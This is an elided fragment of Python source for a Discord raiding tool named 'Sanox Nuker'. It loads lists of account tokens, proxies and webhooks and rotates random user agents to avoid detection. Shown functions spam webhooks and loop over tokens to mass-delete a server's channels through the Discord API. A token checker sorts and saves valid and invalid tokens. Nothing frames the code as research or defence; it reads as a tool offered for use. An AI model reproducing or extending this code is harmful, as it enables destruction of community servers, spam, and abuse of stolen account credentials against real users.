...
System.Clear()
System.Title("SANOX - TOKENS")
lllll = ['proxies.txt', 'webhooks.txt', 'tokens.txt']
if not os.path.exists('./Sanox-Tokens'):
    os.system('md Sanox-Tokens')
    with open('./Sanox-Tokens/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
elif os.path.exists('./Sanox-Tokens') and not os.path.exists('./Sanox-Tokens/useragents.txt'):
    with open('./Sanox-Tokens/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
else:
...
def send_webhook(url=str, content=str, proxy=None):
    try:
        req.post(url=url,
                json={"content": content, "username": "Sanox Nuker", "avatar_url": "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=402&height=402"}
                ,proxies=proxy)
        print_success(url)
...
def random_useragent():
    with open('./Sanox-Tokens/useragents.txt', 'r') as file:
    ...
    if ch == '6':
        ...
        if guilid.isalnum() and len(tokens()) > 0: 
            ...
            for token in tokens():
                headers = {
                    "Authorization": token,
                    "X-Audit-Log-Reason": 'Sanox Nuker',
                    "User-Agent": random_useragent(),
                    "Content-Type": 'application/json'
                }
            ...
            if r.status_code == 200:
                ...
                def delete(channel):
                    b = req.delete(url=f"https://discord.com/api/channels/{channel}",
                               headers={ "Authorization": tokens()[0],
                                        "X-Audit-Log-Reason": "By Sanox Nuker",
                                        "User-Agent": random_useragent()})
    ...
    if ch == '23':
        ...
        if len(tokens()) > 0:
            ...
            for token in tokens(): 
                ...
                yon = input_()
                if yon.lower().startswith('y'):
                    with open("./Sanox-Tokens/valids.txt", 'w') as file:
                        file.write('\n'.join(valids))
                    with open("./Sanox-Tokens/invalids.txt", "w") as file:
                        file.write('\n'.join(invalids))
                    print_("[!!] Saved In /Sanox-Tokens, Press Enter to continue")
                    input()
                await tokenTools()
    if ch == '24':
        print_logo()
